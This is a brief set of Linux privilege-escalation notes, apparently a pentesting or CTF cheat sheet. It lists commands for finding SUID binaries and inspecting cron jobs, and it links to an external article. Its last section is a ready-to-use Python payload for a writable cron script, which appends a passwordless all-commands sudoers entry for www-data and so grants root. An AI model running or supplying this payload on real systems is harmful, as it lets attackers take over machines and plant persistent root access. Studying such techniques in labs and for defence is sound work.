### PRIVESC notes

### suid bits
- Finding files with suid bit

      find / -perm -u=s -type f 2</dev/null

### CRON JOBS
  <a href="https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/">Link to MORE ON CRON JOBS</a>
- Check cronjobs with

       cat /etc/crontab
- Check if the cron job is running with

      service cron status
  
- Script to run if you can write a cronjob script

       import os 
       import sys
       try:
          print("on it")
          os.system("echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
       except:
            print("Didn't work")
            sys.exit()
